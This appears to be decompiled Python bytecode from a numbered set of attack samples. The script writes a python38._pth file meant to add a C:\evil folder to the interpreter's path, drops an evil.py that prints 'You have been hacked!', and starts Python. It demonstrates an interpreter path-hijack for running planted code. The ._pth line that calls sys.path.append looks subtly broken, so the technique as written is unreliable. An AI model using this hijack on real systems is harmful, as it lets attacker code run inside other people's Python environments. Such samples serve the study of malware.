# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 63_2.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 1039 bytes
import os
pth_file = "python38._pth"
pth_content = "import site\nsys.path.append('C:\\\\evil')"
with open(pth_file, "w") as f:
    f.write(pth_content)
code_file = "evil.py"
code_content = "print('You have been hacked!')"
os.makedirs("C:\\evil", exist_ok=True)
with open("C:\\evil\\" + code_file, "w") as f:
    f.write(code_content)
os.system("python")

# okay decompiling 63_2.pyc
